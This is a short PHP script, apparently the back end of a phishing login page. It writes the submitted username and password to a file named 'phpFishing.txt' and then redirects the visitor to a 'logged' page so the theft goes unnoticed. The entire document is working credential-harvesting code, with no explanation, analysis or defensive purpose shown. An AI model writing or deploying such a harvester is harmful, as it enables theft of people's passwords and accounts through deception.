
<?php
$myfile = fopen("/root/phpFishing.txt", "a");
fwrite($myfile, "UserName: ");
fwrite($myfile, $_POST["uname"]);
fwrite($myfile, "    ");
fwrite($myfile, "Password: ");
fwrite($myfile, $_POST["pass"]);
fwrite($myfile, "\r\n");
fclose($myfile);
?>

<script>
window.location = 'logged/logged.html';
</script>
